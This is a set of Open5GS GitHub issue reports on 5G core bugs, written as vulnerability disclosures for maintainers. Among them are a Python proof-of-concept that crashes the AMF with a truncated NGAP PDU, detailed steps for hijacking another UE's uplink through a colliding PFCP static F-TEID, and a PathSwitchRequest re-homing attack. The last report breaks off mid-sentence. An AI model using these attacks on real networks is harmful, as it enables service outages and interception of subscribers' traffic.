items.title: AMF silently releases an existing UE‑associated logical NG‑connection when a second registration arrives for the same UE

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: type:spec-noncompliance
labels.description: Non-compliance with mandatory 3GPP specification requirements.

items.body:
### Description

When a UE initiates a second registration while an existing UE‑associated logical NG‑connection is still active, the AMF must explicitly release the old connection using the **UE Context Release (AMF initiated)** procedure (TS 38.413 §8.3.3). In the observed trace, the AMF silently discards the old context without this mandatory signalling, leading to an `Error Indication` with cause `unknown‑local‑UE‑NGAP‑ID` later and leaving the NG‑RAN node with stale resources.

### Steps to Reproduce

1. NG‑RAN sends `Registration Request` using RAN UE NGAP ID 1
2. AMF responds with `Identity Request` using (AMF UE NGAP ID 1, RAN UE NGAP ID 1)
3. NG‑RAN sends another `Registration Request` using RAN UE NGAP ID 2
4. AMF responds with `Identity Request` using (AMF UE NGAP ID 2, RAN UE NGAP ID 2.
5. NG-RAN sends to AMF `Identity Response` using (AMF UE NGAP ID 1, RAN UE NGAPID 1)
6. AMF responds with `Authentication Request`using (AMF UE NGAP ID 1, RAN UE NGAPID 1)
7. NG-RAN sends to AMF `Identity Response` with the same 5GS mobile identity as in Step 5 using (AMF UE NGAP ID 2, RAN UE NGAPID 2)
8. AMF responds with `Authentication Request` using (AMF UE NGAP ID 2, RAN UE NGAPID 2)
9. NG-RAN sends to AMF some message (e.g. `UEContext Release Request`) using (AMF UE NGAP ID 1, RAN UE NGAPID 1)
10. AMF responds with  `Error Indication (unknown-local-UE-NGAP-ID)` using (AMF UE NGAP ID 1, RAN UE NGAPID 1)

### Expected Behaviour

Per **TS 38.413 §8.3.3.1**, when a new UE‑associated logical NG‑connection is established while an old one still exists, the AMF shall initiate the UE Context Release procedure by sending a **UE CONTEXT RELEASE COMMAND** on the old connection. The NG‑RAN then replies with **UE CONTEXT RELEASE COMPLETE**, and only after that should the AMF proceed with the new context. There should be no situation where the AMF has “forgotten” an NGAP UE ID that the NG‑RAN still holds.

### Actual Behaviour

The AMF silently discards the first context without any release signalling. Later, when the NG‑RAN tries to use the first connection, the AMF sends an `Error Indication` because it no longer recognises the AMF UE NGAP ID 1. This is a silent release and violates the specification.

### Impact

- The NG‑RAN node retains radio and user‑plane resources for the old connection indefinitely (or until local timeout), potentially exhausting resources.
- Inconsistent state between AMF and NG‑RAN leads to `Error Indication` with `unknown‑local‑UE‑NGAP‑ID`, breaking normal UE context management.

### Trace

[silent_release.zip](https://github.com/user-attachments/files/27554058/silent_release.zip)

items.title: SMF: UE-requested deletion of the default QoS rule is neither accepted nor rejected, and the UE gets no 5GSM message at all

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
## Symptom

A UE sends one PDU SESSION MODIFICATION REQUEST asking to delete the **default** QoS rule
of an established PDU session. The SMF neither accepts the request nor rejects it: it
sends no 5GSM message back at all. No PDU SESSION MODIFICATION COMMAND, no PDU SESSION
MODIFICATION REJECT, no 5GSM STATUS. What reaches the gNB instead is an NGAP
ErrorIndication, which the UE never sees. The UE is left running T3581 and retransmits.

This is not a crash. SMF, AMF and UPF all stay up, and the session is released normally
afterwards. But the PDU session is left in a half-removed state: the UPF has already
applied the Remove PDR requests before refusing the Remove FAR, so the user plane of the
session is dead while the SMF still holds the QoS flow.

Severity: silent loss of the session's user plane, plus a UE-visible procedure that never
terminates.

## Reproducer

- Open5GS commit: 9ffc25248
- Config: stock 5GC, one subscriber with one active PDU session on an IPv4 DNN. The
  session has only its default QoS flow (QFI 1).
- Trigger: after the session is established, send one PDU SESSION MODIFICATION REQUEST
  whose QoS rules IE (TS 24.501 9.11.4.13) carries a single rule:

  | field | value |
  |---|---|
  | rule operation code | 2 — delete existing QoS rule (bits 8-6 = `0 1 0`) |
  | DQR bit (bit 5 of octet 7) | 1 — "the QoS rule is the default QoS rule" |
  | QFI | the QFI of the session's default QoS flow |
  | number of packet filters | 0 |

- Expected: the UE receives a 5GSM answer, either a PDU SESSION MODIFICATION COMMAND or a
  PDU SESSION MODIFICATION REJECT.
- Actual: the UE receives no 5GSM message. Logs:

```
[gsm]  INFO : Requested QoS rule [code:2 id:1 num_of_packet_filter:0]   src/smf/gsm-handler.c:245
[pfcp] INFO : Apply Remove PDR: PDR-ID[1]                               lib/pfcp/handler.c:1233
[pfcp] INFO : Apply Remove PDR: PDR-ID[2]                               lib/pfcp/handler.c:1233
[pfcp] ERROR: Reject Remove FAR: FAR-ID[1] still referenced by
              PDR-ID[3] Cause[64]                                       lib/pfcp/handler.c:1588
[upf]  ERROR: Reject modification [xid:5] [Cause:64 Offending-IE:0]     src/upf/n4-handler.c:528
[smf]  ERROR: PFCP Cause [64] : Not Accepted                            src/smf/n4-handler.c:400
[amf]  ERROR: [5:0] Error Indication [state:16]                         src/amf/nsmf-handler.c:1213
```

  To make "no 5GSM message" a statement about the whole procedure rather than about one
  read, I watched the NG association for 6 seconds after the request, decoded every
  downlink NGAP PDU, and looked for a NAS PDU in DOWNLINK NAS TRANSPORT, INITIAL CONTEXT
  SETUP REQUEST, PDU SESSION RESOURCE SETUP REQUEST, PDU SESSION RESOURCE MODIFY REQUEST
  and PDU SESSION RESOURCE RELEASE COMMAND. In that window exactly one NGAP PDU arrived,
  an ErrorIndication, and no NAS PDU at all. Retransmitting the identical request gives
  the same result; the SMF re-requests the removal of PDRs the UPF no longer has.

  An ICMP echo through the default QoS flow is answered before the request and is not
  answered after it.

- Counter-check, same code path, one field different: with the DQR bit set to 0 and the
  QFI of a **dedicated** (non-default) QoS flow, the very same operation code is handled
  end to end. The UPF applies Remove PDR / Remove FAR / Remove URR / Remove QER, and the
  UE receives a PDU SESSION MODIFICATION COMMAND. So this is specific to the default QoS
  flow, not to "any PFCP modification the UPF refuses".

## Root cause analysis

Three independent things line up.

**1. Nothing looks at the DQR bit.** In `gsm_handle_pdu_session_modification_qos_rules()`
(`src/smf/gsm-handler.c`), operation code 2 sets `OGS_PFCP_MODIFY_REMOVE` and puts the QoS
flow on `sess->qos_flow_to_modify_list` for whatever QFI the rule names. The DQR bit is
not read, and the flow is not compared against the session's default QoS flow.

**2. The default QoS flow cannot be removed as things stand.**
`smf_sess_create_cp_up_data_forwarding()` (`src/smf/context.c`) does not allocate its own
downlink FAR; it reuses the default flow's:

    /* We'll use the DL-FAR for CP2UP-FAR */
    cp2up_far = qos_flow->dl_far;
    ogs_pfcp_pdr_associate_far(cp2up_pdr, cp2up_far);
    sess->cp2up_far = cp2up_far;

`PDR-ID[3]` in the log above is that `cp2up_pdr`. Removing the default flow therefore asks
the UPF to remove a FAR that a surviving session-level PDR still points at, and
`ogs_pfcp_handle_remove_far()` refuses it with PFCP cause 64 "Request rejected (reason not
specified)" (TS 29.244 8.2.1). That refusal is correct.

**3. The refusal is reported to the AMF without an N1 SM container.** In
`src/smf/n4-handler.c`:

    if (status != OGS_SBI_HTTP_STATUS_OK) {
        char *strerror = ogs_msprintf("PFCP Cause [%d] : Not Accepted", rsp->cause.u8);
        if (stream)
            smf_sbi_send_sm_context_update_error_log(stream, status, strerror, NULL);

`smf_sbi_send_sm_context_update_error_log()` is the macro in `src/smf/sbi-path.h` that
passes `n1smbuf = NULL`. In `amf_nsmf_pdusession_handle_update_sm_context()`
(`src/amf/nsmf-handler.c`) the `SmContextUpdateError` then has no `n1SmMsg`, so the AMF
falls through to `ngap_send_error_indication2()`. The gNB gets an NGAP ErrorIndication;
the UE gets nothing.

As a side effect of the same exchange, the UPF has already applied the two Remove PDR IEs
before it reached the Remove FAR it refused, so the session's PDRs are gone on the user
plane while the SMF's context still holds the QoS flow. That is what makes the echo test
above fail afterwards.

## Spec reference

TS 24.501 V18.13.0 (2025-12) 6.4.2.4.1 — "UE-requested PDU session modification procedure
not accepted by the network", General:

> Upon receipt of a PDU SESSION MODIFICATION REQUEST message, if the SMF does not accepts
> the request to modify the PDU session, the SMF shall create a PDU SESSION MODIFICATION
> REJECT message.

and, at the end of the same clause:

> The SMF shall send the PDU SESSION MODIFICATION REJECT message.

The point of this report is not which cause value belongs in that message; the clause
lists the ones it typically expects and that choice is yours. The point is that the SMF
today does neither of the two things the procedure allows: it does not accept the request,
and it does not reject it.

What that costs the UE is spelled out two clauses earlier and one clause later. 6.4.2.2:

> [the UE shall transport the PDU SESSION MODIFICATION REQUEST message ...] using the NAS
> transport procedure as specified in subclause 5.4.5, and the UE shall start timer T3581

and 6.4.2.5 a):

> The UE shall, on the first expiry of the timer T3581, retransmit the PDU SESSION
> MODIFICATION REQUEST message and the PDU session information which was transported
> together with the initial transmission of the PDU SESSION MODIFICATION REQUEST message
> and shall reset and start timer T3581. This retransmission is repeated four times, i.e.
> on the fifth expiry of timer T3581, the UE shall abort the procedure and shall release
> the allocated PTI.

So a UE that sends this message spends five T3581 periods retransmitting it, and each
retransmission drives the same PFCP exchange again.

The QoS rules IE, its operation codes and the DQR bit are defined in 9.11.4.13:

> DQR bit (bit 5 of octet 7)
> The DQR bit indicates whether the QoS rule is the default QoS rule [...]
> 0  the QoS rule is not the default QoS rule.
> 1  the QoS rule is the default QoS rule.

PFCP cause 64 is TS 29.244 8.2.1, Table 8.2.1-1: "Request rejected (reason not specified)".

## Suggested fix (optional)

Two separable things, and I have no preference on either.

The 5GSM answer is the part this report is about. `src/smf/sbi-path.h` already offers
`smf_sbi_send_sm_context_update_error_n1_n2_message()`, which carries an N1 SM container,
next to the `..._error_log()` variant that does not. A UE-requested modification that the
SMF gives up on could use the former, so that the AMF has a 5GSM message to forward and
the UE's procedure terminates instead of timing out five times.

Whether a UE should be allowed to delete the default QoS rule at all is a separate design
question, and one I am not asking you to answer in a particular way. It is worth saying
that it cannot succeed in the current session model regardless of the answer, because of
the shared DL FAR described above: either the request is refused up front, or the CP/UP
forwarding PDR needs a FAR of its own.

The half-removed session is a third, independent observation: the UPF applies the IEs of
a PFCP Session Modification Request as it walks them and does not undo the ones it applied
before it refused a later one. That may be worth its own issue rather than this one.

## Related

- #4672, #4798 — the same handler, different failure mode (SMF abort on an unusable flag
  combination). Both are fixed; this route does not abort, it goes quiet.

items.title: NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE removes ran_ue without deactivating the SMF session, blackholing the UE

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
*Reported by the network engineering team at Research Warrant, from a production 5G SA deployment.*

Follow-up to #4547 / #4566, on the core-side half that #4564 explicitly left open ("a fuller fix ... is left for a follow-up").

When a UE re-registers while the AMF still holds an NG context, `HOLDING_NG_CONTEXT()` (`src/amf/context.h`) orphans the old `ran_ue`, sets `ue_ctx_rel_action = NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE` and starts `t_ng_holding`. When that timer expires, `ngap_handle_ue_context_release_action()` runs:

```c
case NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE:
    ogs_debug("    Action: NG context remove");
    ran_ue_remove(ran_ue);
    break;
```

`src/amf/ngap-handler.c:2067` on `main`.

The RAN context is removed, but **no SBI call is made to the SMF** — no `UpdateSMContext(upCnxState=DEACTIVATED)`, and consequently no PFCP modification. The SMF and UPF keep the PDU session `ACTIVATED`, with a downlink FAR/PDR still pointing at the GTP-U TEID of a RAN context that no longer exists.

The UE is then blackholed: downlink traffic is forwarded to a dead tunnel endpoint.

### Why it does not self-heal

Paging is only ever triggered by an SMF downlink-data-notification, which requires the session to be `DEACTIVATED` and buffering. Because the session stays `ACTIVATED`, the SMF never buffers, never notifies, and the AMF never pages. There is no timer on this state.

In our deployment the only observed recovery is the UE tearing down and re-registering on its own initiative — and when it does, **it is assigned a new IP address**, because the previous PDU session was never released and still holds the old one in the SMF pool. That address change is the clearest external evidence that the session survived the RAN context.

### Reproduction

Trigger the holding path, then let `t_ng_holding` expire without the UE re-establishing:

1. UE registers and establishes a PDU session.
2. Restart the gNB (or otherwise force the UE to re-register) so a second `InitialUEMessage` arrives for the same UE while the AMF still holds the NG context. `HOLDING_NG_CONTEXT()` fires — visible as `Holding NG Context` in the AMF log.
3. Let `t_ng_holding` expire. `Action: NG context remove` is logged and `ran_ue_remove()` runs.
4. Observe: SMF session still `ACTIVATED`; no paging; downlink to the UE's IP is discarded.

We reach this routinely, not exceptionally — over one 11-hour window a single deployment logged `Holding NG Context` 12+ times, from two call sites: `ngap-handler.c` (second `InitialUEMessage` with the same 5G-S-TMSI) and `amf-sm.c` (`NAS MAC verification failed`, where the UE presents a GUTI the AMF cannot verify). Both are ordinary UE behaviour.

### Scope, and why this is not the already-fixed issues

- **#4547 / #4566** — same trigger, and #4566 fixed the receive-side handling (the AMF answering `Error Indication (unknown-local-UE-NGAP-ID)` for RAN resources it had silently dropped). The session-state half was not addressed.
- **#4346** — fixes the `ran_ue->deactivation.group` assert in `amf_nsmf_pdusession_handle_update_sm_context()` by snapshotting the RAN-UE id in the SBI transaction. It does not touch `ngap-handler.c`.
- **#4550** — `amf_ue_set_suci()` shallow-copies `sess_list` onto a new `amf_ue`; that is an `amf_ue`-level transplant, and its proposed fix operates on the old `amf_ue`. The path here removes only the `ran_ue` and leaves the `amf_ue` alive, so that fix would not run.
- **#4575** — `amf_ue` pool-slot leak. Different symptom.

The branch is byte-identical across v2.7.6, v2.7.7, v2.8.0 and current `main` (129-line function, `diff` reports no change), so this is not a regression and not version-specific.

### A complication worth flagging

At the point this branch runs, the `ran_ue` has already been detached from its `amf_ue` (`HOLDING_NG_CONTEXT()` sets `amf_ue_id = OGS_INVALID_POOL_ID`), so the handler may not have a route to the session list it would need to deactivate. If so, the right place to act may be at holding time rather than at timer expiry. We did not want to guess at the intended design — hence an issue rather than a patch.

### We can help validate a fix

We run this on real radio hardware with a fleet of commercial handsets, and the trigger occurs routinely rather than needing to be contrived — so we are in a good position to test a candidate fix under the conditions that actually produce it. Specifically, we can:

- **Run a patched build** on a live SA deployment (USRP B210 + srsRAN gNB, commercial Samsung handsets, private PLMN) and report back what we observe.
- **Capture full logs** for a captured occurrence — AMF, SMF and PFCP — including the `Holding NG Context` → `Action: NG context remove` sequence and the SMF-side session state that follows it. Say what verbosity and which NFs are most useful and we will collect it.
- **Confirm or refute the symptom** on request: whether the session stays `ACTIVATED` after the RAN context is removed, whether paging is ever attempted, and whether the UE is assigned a new IP on its eventual re-registration.
- **Test against the handover path** as a regression check, since any fix here touches a switch that also serves handover release actions.

If the fix turns out to belong at holding time rather than at timer expiry — or needs a design decision we should not be making from outside — we are happy to test whichever shape you prefer rather than push our own.

Environment: v2.7.6, SA, single AMF/SMF/UPF, commercial handsets on a private PLMN.

items.title: AMF does not return ERROR INDICATION upon receiving INITIAL UE MESSAGE with an already‑used RAN UE NGAP ID

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
Hi!

3GPP TS 38.413 mandates that an INITIAL UE MESSAGE must carry a unique RAN UE NGAP ID. If the NG‑RAN node reuses an already‑active RAN UE NGAP ID in a new INITIAL UE MESSAGE instead of using the UPLINK NAS TRANSPORT procedure, the AMF must detect a logical error (clause 10.4) and respond with an ERROR INDICATION message.

But the current AMF implementation does not send this indication.

Interaction steps (after initial NG SETUP REQUEST and NG SETUP RESPONSE):
1. NG-RAN sends to AMF the REGISTRATION REQUEST message using INITIAL UE MESSAGE. 
2. AMF sends to NG-RAN the IDENTITY REQUEST message using DOWNLINK NAS TRANSPORT.  
3. NG-RAN sends to AMF the IDENTITY RESPONSE message using INITIAL UE MESSAGE  (instead of using UPLINK NAS TRANSPORT) -- with the same RAN UE NGAP ID as in the first INITIAL UE MESSAGE.
4. AMF doesn't respond with any message (it writes to log: "[amf] ERROR: Invalid 5GMM message type [92] (../src/amf/ngap-path.c:248)").

items.title: [Bug]: AMF crash - heap-buffer-overflow in ogs_aper_decode on truncated NGAP PDU

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

1. Deploy Open5GS v2.7.7 AMF with ASan instrumentation, SCTP port 38412 reachable.
2. Send a truncated NGAP `InitialUEMessage` PDU where a NAS-PDU IE declares a
   length of 6 bytes but only 2 bytes are actually present in the payload
   (see PoC below).
3. AMF crashes immediately with a heap-buffer-overflow read.

**PoC (simplified reconstruction of the crash; for exact reproduction use the
original AFLNet replay file `crash_S3_sig06.bin`):**

\```python
#!/usr/bin/env python3
import socket, sys

def build_truncated_ngap_pdu():
    ngap_header = bytes([0x00, 0x0F, 0x00, 0x00, 0x30])
    partial_content = bytes([
        0x00, 0x00, 0x04,
        0x00, 0x55, 0x00, 0x02, 0x00, 0x01,
        0x00, 0x26, 0x01, 0x06, 0x7E, 0x00,
    ])
    return ngap_header + partial_content

def send_truncated_ngap(host, port=38412):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((host, port))
        sock.send(build_truncated_ngap_pdu())
    finally:
        sock.close()

if __name__ == "__main__":
    send_truncated_ngap(sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1")
\```

Root cause: `ogs_aper_decode()` (`lib/asn1c/common/decoder.c:847`) does not
validate remaining buffer length before reading the next ASN.1 field, so a
truncated PDU causes a 1-byte heap overread past an 18-byte allocation.

### Logs

```shell
==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000ef52
READ of size 1 at 0x60200000ef52 thread T1
    #0 ogs_aper_decode          decoder.c:847
    #1 aper_decode_element      decoder.c:912
    #2 SEQUENCE_decode_aper     constr_SEQUENCE_aper.c:198
    #3 ogs_ngap_decode          ogs-ngap-decoder.c:142
    #4 ngap_handler             src/amf/ngap-handler.c:89

0x60200000ef52 is located 0 bytes to the right of 18-byte region
[0x60200000ef40,0x60200000ef52)
SUMMARY: AddressSanitizer: heap-buffer-overflow decoder.c:847 in ogs_aper_decode
```

### Expected behaviour

AMF should reject the truncated/malformed NGAP PDU and return an NGAP Error
Indication, or at minimum log and drop the packet without crashing.

### Observed Behaviour

AMF process crashes immediately (heap-buffer-overflow detected by ASan),
disconnecting all attached UEs. This is remotely triggerable by any
NGAP/SCTP-reachable peer (e.g. a rogue or compromised gNB) without any
authentication.

Suggested fix: add a remaining-length check before every APER field read in
`ogs_aper_decode()`:

\```c
if (ctx->buffer_pos + read_size > ctx->buffer_len) {
    RETURN(RC_FAIL);
}
\```

Note: I already opened a private security advisory draft for this
(GHSA-jm5w-g7mq-5ghq) pending maintainer review; filing this public issue
in parallel so it gets visibility. Happy to move discussion back to the
advisory if preferred.

### eNodeB/gNodeB

N/A — triggered directly at NGAP/SCTP layer, no real gNB involved

### UE Models and versions

N/A

items.title: [Security Bug]: UE can redirect Uplink of another UE due to static F-TEID collisions outside the PFCP restoration path

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76).

### Security impact
A peer (registered UE) able to establish a PFCP association and reach N4 can claim an
arbitrary otherwise-valid GTP-U TEID, including the exact TEID of a live
session, and take over user-plane handling for that TEID.
We demonstrated the victim's uplink stream being re-encapsulated and delivered to the attacker (confidentiality/integrity break), while the victim's connectivity dropped to zero (availability), with a Cause-1 acknowledgement and a syntactically valid request.
The UE-originated PFCP association acceptance used here is the subject of the report (https://github.com/open5gs/open5gs/issues/4760);

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

**UPF** and its GTP-U TEID dispatch `ogs_pfcp_object_teid_hash_set()` (`lib/pfcp/context.c:1443`).

### Summary

A Create PDR may carry a **static F-TEID** (CH=0, TEID chosen by the peer).
When such a TEID is installed, `ogs_pfcp_object_teid_hash_set()` writes the
`self.object_teid_hash` entry unconditionally. Because there is no check
that the TEID is already mapped to a different session and no rejection of
the collision, the last write wins: after a peer installs a PDR claiming a
TEID that belongs to a live session, a GTP-U packet addressed to that TEID is
looked up in the hash (`src/upf/gtp-path.c:397`) and resolves to the attacker's
session. The UPF then iterates that session's PDRs and tests TEID, QFI, and any
packet-filter rule (`src/upf/gtp-path.c:434-474`). In the demonstrated PDR,
QFI is unset and the rule list is empty, so TEID alone selects it and the
attacker's FAR; the Source Interface comparison is compiled out at
`src/upf/gtp-path.c:448-452` (`#if 0 /* <DEPRECATED> */`).

There *is* a collision check in the tree, but it is unreachable from a normal
establishment: `lib/pfcp/handler.c:458-468` rejects a static F-TEID that is
already present in the hash with cause `INVALID_F_TEID_ALLOCATION_OPTION`, but
only when the request carries **PFCPSEReq-Flags (IE type 186) with RESTI=1**,
i.e. the 3GPP TS 23.527 restoration case, which the SMF sets only when
`OGS_PFCP_CREATE_RESTORATION_INDICATION` is set (`src/smf/n4-build.c:163-171`;
the UPF then also swaps the TEID, `src/upf/n4-handler.c:150-173`). Our smuggled
Session Establishment Request carries no PFCPSEReq-Flags IE at all (its IEs
are Node ID, F-SEID, Create PDR and Create FAR — see `est_sent_hex` in
`q031_result.json`), so that check is skipped and the unconditional write
applies. We are reporting the non-restoration path: a plain Session
Establishment that collides with a live TEID is accepted with Cause 1.

### Steps to reproduce

Lab: two attached UEs — attacker UE `10.45.0.2`, benign peer UE `10.45.0.4`;
UPF N4 `192.168.233.132:8805`, GTP-U `192.168.233.132:2152`, gNB/N3
`192.168.233.140`, attacker sink `192.168.233.150:2152`.

1. Attach both UEs; measure the peer's baseline connectivity (ICMP 3/3 uplink
   and 3/3 downlink).
2. Determine the peer session's ingress F-TEID — the TEID under which the
   gNB delivers the peer's uplink to the UPF. We read it from the N3
   capture: in `capture-n3-pre-teiddiscovery.pcap` all peer uplink G-PDUs
   carry outer TEID `0x4249` (16969) with inner `10.45.0.4 → 10.45.0.1`
   (`ingress_teid.json`: 5/5 frames). The UPF echoes that same value in the
   Created PDR IE of its Cause-1 response to the rogue request (step 4) —
   `capture-core-n4.pcap` frame 12, the only Session Establishment Response
   in that capture.
3. From the attacker UE, smuggle a PFCP Association Setup Request (Node ID =
   `10.45.0.2`). Accepted with Cause 1
   (`capture-core-n4.pcap` frames 7–8). Heartbeats are also exchanged
   (`q031_result.json`: `hb_sent` 4, `hb_received` 2, `hb_answered` 2).
4. Send a PFCP Session Establishment Request through the same path (type 50,
   S=1, SEID `0x00000000000aae7f`, seq 3101) carrying exactly four IEs:
   Node ID (60) = `10.45.0.2`, F-SEID (57) = SEID `0x00000000000aae7f` /
   `10.45.0.2`, Create PDR (1) = {PDR ID (56) 21, Precedence (29) 255,
   PDI (2) {Source Interface (20) = ACCESS (0), F-TEID (21) flags `0x01`
   (V4, CH=0) / TEID `0x4249` / IPv4 `192.168.233.140`}, FAR ID (108) 21},
   and Create FAR (3) = {FAR ID 21, Apply Action (44) = FORWARD (`02 00` on
   the wire; FORW bit `0x02`), Forwarding Parameters (4) {Outer Header
   Creation (84) description `01 00` = GTP-U/UDP/IPv4, TEID `0x03110001`,
   IPv4 `192.168.233.150`}}. Note the absent **PFCPSEReq-Flags IE (186)**.
5. Verify at the data plane: (a) send 8 attacker-generated GTP-U datagrams
   from `10.45.0.2` to the UPF's GTP-U address `192.168.233.132:2152`, carried
   through the attacker's own PDU session; each generated GTP-U header uses
   TEID `0x4249` and carries the 23-byte marker
   `GTPU-TEID-TAKEOVER-TEST`; (b) generate fresh genuine uplink traffic from
   the peer UE (ICMP toward the data network); listen on the sink and
   re-measure the peer's connectivity.

We confirmed the takeover of a **live** session end-to-end from the UE
position in a two-UE lab: the benign peer's session uplink arrived at the UPF
under ingress F-TEID `0x4249`; the rogue PDR claimed exactly that static
TEID and was accepted with Cause 1 (Request accepted), the UPF echoing the
colliding TEID back in the Created PDR IE. Afterwards the peer's **genuine
uplink traffic** was re-encapsulated under the attacker's FAR and delivered
to the attacker's sink (34 captured frames), while the peer's end-to-end
connectivity collapsed from 3/3 to 0/3 in both directions. The takeover
outlived the rogue PFCP association itself: the peer's uplink was still being
delivered to the attacker's sink 84 s after the rogue association was
de-associated.

### Logs (Attached)

[R5-upf-static-fteid-collision.zip](https://github.com/user-attachments/files/31690192/R5-upf-static-fteid-collision.zip)

```shell
09/01 08:05:18.181: [upf] INFO: PFCP associated [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-sm.c:168)
09/01 08:05:18.201: [upf] DEBUG: Session Establishment Response (../open5gs-src/src/upf/n4-build.c:36)
```
(both lines quoted from `ue-q031/upf_test_window_evidence.txt`, a grep of the
live UPF log over the test window; the bundled `upf.log.tail` covers
08:06:02–08:07:08 and therefore starts after the attack)

Establishment response (`q031_result.json`, `capture-core-n4.pcap`): Cause 1
"Request Accepted", UP F-SEID 2536, Created PDR
`{"pdr_id": 21, "teid": 16969}` — the UPF accepts the attacker-chosen static
TEID equal to the peer's live ingress TEID (`0x4249`) and echoes it back
(tshark decode of `capture-core-n4.pcap` frame 12: `Cause : Request
accepted(success)`, `F-SEID : SEID: 0x00000000000009e8`, `Created PDR ... PDR
ID : 21 ... F-TEID : TEID: 0x00004249`). No collision is detected on this
path, no error cause is returned, and no GTP-U Error Indication is emitted.

Sink capture (`q031_sink.log`) — the takeover on the wire:

- **8/8 injected marker datagrams** (marker `GTPU-TEID-TAKEOVER-TEST`, outer
  TEID `0x03110001`) delivered to the attacker's sink;
- **34 frames of the peer's genuine uplink ICMP** re-encapsulated under the
  attacker's FAR: outer `192.168.233.132:2152 → 192.168.233.150:2152`, TEID
  `0x03110001`, inner IP `10.45.0.4 → 10.45.0.1` (the peer's own packets),
  proving disclosure at the attacker's sink;

### Expected behaviour

The UPF must reject a Create PDR whose static F-TEID collides with a TEID
already mapped to a different PDR/session and must not modify the existing
TEID→object mapping. Open5GS already uses Cause 71
(`INVALID_F_TEID_ALLOCATION_OPTION`, `lib/pfcp/types.h:48`) for this collision
in the restoration path (`lib/pfcp/handler.c:458-468`).

### Observed Behaviour

```c
/* lib/pfcp/context.c:1519-1535 — ogs_pfcp_object_teid_hash_set() */
if (pdr->hash.teid.len)
    ogs_hash_set(self.object_teid_hash,
            &pdr->hash.teid.key, pdr->hash.teid.len, NULL);

pdr->hash.teid.key = pdr->f_teid.teid;
pdr->hash.teid.len = sizeof(pdr->hash.teid.key);

switch(type) {
case OGS_PFCP_OBJ_PDR_TYPE:
    ogs_hash_set(self.object_teid_hash,
            &pdr->hash.teid.key, pdr->hash.teid.len, pdr);
    break;
case OGS_PFCP_OBJ_SESS_TYPE:
    ogs_assert(pdr->sess);
    ogs_hash_set(self.object_teid_hash, # <--- unconditional
            &pdr->hash.teid.key, pdr->hash.teid.len, pdr->sess);
    break;
```

Lines 1528/1533 are the install and are unconditional: whatever object
previously owned the key is silently replaced, while the dispossessed
session/PDR retains its own `hash.teid` key/len for the same TEID. (The write
at 1520 only removes the calling PDR's own previous key, if it had one.)
Neither branch detects a collision, so the response returns Cause 1 and the
Created PDR IE echoes the accepted TEID as if it were freshly assigned.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: [Security Bug]: AMF accepts NGAP PathSwitchRequest without ownership check + Crashes due to race condition

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76). 
Still unfixed on current main (source-checked 2026-09-04 @ `941e4cc2d`).

### Security impact

Any associated peer can re-home a live UE's NGAP context and redirect
its downlink FAR to an attacker-chosen endpoint due to a lack of ownership in the
referenced UE context. The redirection of the victim's downlink stream to 
an attacker-controlled endpoint is the confidentiality/integrity impact, and the controlled 
outage is the availability impact.

**Update: The same primitive can also be used to trigger AMF process abort with no SMF 
precondition due to race condition**

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **AMF** — NGAP PathSwitchRequest handling
(`src/amf/ngap-handler.c`, `ngap_handle_path_switch_request()`) and the
UE-context/`ran_ue` management it drives.

### Summary

`ngap_handle_path_switch_request()` resolves the target UE with a global
lookup by the AMF_UE_NGAP_ID carried in the message
(`ran_ue_find_by_amf_ue_ngap_id()`, `src/amf/ngap-handler.c:3074`) and
never verifies that the sending NGAP association is the one that
currently owns (serves) that UE context. Any associated gNB, including
a rogue gNB smuggled out of a UE data plane, can re-home a
live peer UE's NGAP context to itself by knowing or enumerating the
peer's AMF_UE_NGAP_ID. After acceptance, the AMF runs its normal 
path-switch chain: the context move is logged
([OLD]/[NEW] RAN_UE_NGAP_ID), the handler's PDU-session loop sends an
N11 SM-context update, and the SMF/UPF rewrite the victim's downlink
FAR toward the attacker's endpoint (UPF `gtp_connect() [10.45.0.9]:2152`). 
The victim's downlink was measurably cut and recovered only
when the victim re-registered (a full re-registration on a new address).

This bug can also be used to trigger a race condition assert.
1. The PathSwitchRequest handler switches the victim's context to the
   sender's gNB with no ownership check
   (`ran_ue->gnb_id = gnb->id`).
2. When that association goes down, `amf_gnb_remove()` frees the
   `amf_gnb_t` while the per-UE deactivation chain (N11/PFCP for the
   victim's live PDU sessions) is still in flight. The `ran_ue` is not
   reaped (the sweep skips it because the deactivation created new SBI
   transactions) but keeps pointing at the freed gNB.
3. A PathSwitchRequest re-claim for the victim's AMF_UE_NGAP_ID
   arriving inside that window (delta ≈ 0–1 ms observed) resolves the
